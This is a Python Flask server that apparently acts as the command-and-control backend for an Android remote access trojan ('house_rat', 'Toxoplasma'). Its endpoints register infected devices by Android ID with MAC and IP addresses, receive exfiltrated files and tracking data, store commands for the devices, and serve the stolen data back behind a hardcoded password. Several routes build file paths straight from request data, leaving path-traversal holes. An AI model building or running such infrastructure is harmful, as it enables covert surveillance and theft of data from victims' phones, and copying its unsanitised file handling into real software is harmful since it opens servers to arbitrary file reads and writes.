from flask import Flask, request 
import requests as r
import json 
import ast 
import base64
app = Flask(__name__)


@app.route('/', methods=[ 'GET'])
def index() :
    return 'hello' 


@app.route('/calls', methods=['POST', 'GET'])
def calls() :
    data = request.data 
    data = data.decode('utf-8')
    data = ast.literal_eval(data)
    
    
    id = data.keys()
    id = list(id)[0] 
    brand = data[id]['brand'] 
    version = data[id]['version'] 
    mac_addr = data[id]['mac_id'] 
    ip_addr = data[id]['ip_addr']
    internet_ip = data[id]['internet_ip']
    
    print(brand)
    print(version)
    print(mac_addr)
    print(ip_addr)
    print(internet_ip)
    
    
    print(id)
    
    f = open('database/android_id', 'r') 
    data = f.read() 
    f.close() 
    
    data = ast.literal_eval(data)
    print(data)
    x = {"brand" : brand , "version" : version , "mac_id" : mac_addr , "ip_addr" : ip_addr , "internet_ip" : internet_ip } 
    data[str(id)] = x 
    
    f = open('database/android_id', 'w')
    f.write(str(data)) 
    f.close() 
    
    return 'Hello world'
    
###surgery 
#@app.route('/surgery_pent', methods=['POST', 'GET'])
#def surgery_pent() :

 #   data = request.data 
  #  data = data.decode('utf-8') 
    
   # if data == "surgery_pent" :
    #   f = open('database/surgery', 'r')
     #  return_data = f.read() 
      # f.close() 
   # else : 
    #   return_data = "You is a still a shit"
       
   # return return_data 
   


@app.route('/file_pent', methods=['POST', 'GET'])
def get_file() :
    f = open('storage/file', 'rb')
    data = f.read() 
    f.close() 
    
    return data 

@app.route('/file', methods=['POST', 'GET'])
def upload() :
    data = request.data 
    data = base64.b64decode(data)
    
    f = open('storage/file', 'wb')
    f.write(data)
    f.close() 
    
    return 'hello'

@app.route('/surgery', methods=['POST', 'GET'])
def surger() :
    data = request.data 
    data = data.decode('utf-8') 
    
    f = open('database/surgery', 'w')
    f.write(data)
    f.close() 
    
    return 'hello' 


@app.route('/tracks_pent', methods=['POST', 'GET'])
def tracks_pent() :
    data = request.data 
    data = data.decode('utf-8')
    
    if data == "tracks_pent" :
       f = open('database/tracks', 'r')
       return_data = f.read() 
       f.close() 
    else : 
       return_data = "You is a shit" 
       
    return return_data 
    

@app.route('/tracks', methods=['POST', 'GET'])
def tracks() : 
    data = request.data 
    data = data.decode('utf-8')
    
    f = open("database/tracks", "w")
    f.write(data)
    f.close() 
    
    return 'hello' 
    

@app.route('/rat_reset', methods=['POST','GET'])
def toxoplasma_reset() :
    data = request.data 
    data = data.decode('utf-8')
    
    if data == "rat is smilling" :
       f = open("database/Toxoplasma", "w")
       f.write('')
       f.close() 
       
    return 'hello bitch' 


@app.route('/Toxoplasma_pent', methods=['POST','GET'])
def Toxoplasma_pent() :
    data = request.data 
    data = data.decode('utf-8')
    
    f = open("database/Toxoplasma", "w")
    f.write(data)
    f.close() 
    
    return "hello" 

@app.route('/Toxoplasma', methods=['POST','GET'])
def Toxoplasma() :
    print("hello")
   
    f = open("database/Toxoplasma", 'r')
  
    return_data = f.read()
    f.close() 
   
    return return_data 
    
######  
@app.route('/reset', methods=['POST', 'GET'])
def reset() :
    data = request.data 
    data = data.decode('utf-8') 
    
    f = open('database/'+data, 'w')
    f.write('')
    f.close() 
    
    return 'hello' 
    
@app.route('/get_pent_text', methods=['POST', 'GET'])
def get_house_rat() :
    data = request.data
    print(data)
    data = data.decode('utf-8')
    print(data)
    data = ast.literal_eval(data)
    
    if data['password'] == "@dj393hf5f87+-d*d" :
       f = open('database/'+data['file'], 'r')
       return_data = f.read()
       f.close() 
    return return_data 

@app.route('/house_rat', methods=['POST','GET'])
def update_house_rat() :
    data = request.data
    data = data.decode('utf-8')
    print(data)
    
    data = ast.literal_eval(data)
    id = data['house_rat']
    status = data['message']

    f = open("database/house_rats", "r")
    data = f.read()
    data = ast.literal_eval(data) 
    data[id] = status
    f.close()

    f = open("database/house_rats", "w")
    f.write(str(data))
    f.close()

    return 'Hello world'


app.run(host="0.0.0.0", port=5000)
